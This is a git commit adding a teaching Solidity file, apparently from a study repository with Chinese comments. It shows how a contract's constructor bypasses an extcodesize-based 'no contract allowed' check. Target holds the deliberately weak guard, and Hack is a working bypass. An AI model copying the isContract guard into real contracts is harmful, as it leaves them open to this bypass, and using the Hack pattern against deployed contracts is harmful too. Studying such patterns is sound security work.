2bbd1c339f97c0679f41172e6befbdb974b85c10
sole <52155079+sole12343@users.noreply.github.com>
2022-05-30 22:49:38 +0800

    Create Bypass_Contract_Size_Check.sol

---
+++ Bypass_Contract_Size_Check.sol
@@ -0,0 +1,47 @@
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.13;
+
+contract Target {
+    function isContract(address account) public view returns (bool) {
+        // This method relies on extcodesize, which returns 0 for contracts in
+        // construction, since the code is only stored at the end of the
+        // constructor execution.
+        uint size;
+        assembly {
+            size := extcodesize(account)
+        }
+        return size > 0;
+    }
+
+    bool public pwned = false;
+
+    function protected() external {
+        require(!isContract(msg.sender), "no contract allowed");
+        pwned = true;
+    }
+}
+
+contract FailedAttack {
+    // Attempting to call Target.protected will fail,
+    // Target block calls from contract
+    function pwn(address _target) external {
+        // This will fail
+        Target(_target).protected();
+    }
+}
+
+contract Hack {
+    bool public isContract;
+    address public addr;
+
+    // When contract is being created, code size (extcodesize) is 0.
+    // This will bypass the isContract() check
+    //因为合约刚运行到构造函数，合约还没创建完，合约的size是0，
+    //此时可以掉用target的protrcted函数，修改pwned的值
+    constructor(address _target) {
+        isContract = Target(_target).isContract(address(this));
+        addr = address(this);
+        // This will work
+        Target(_target).protected();
+    }
+}
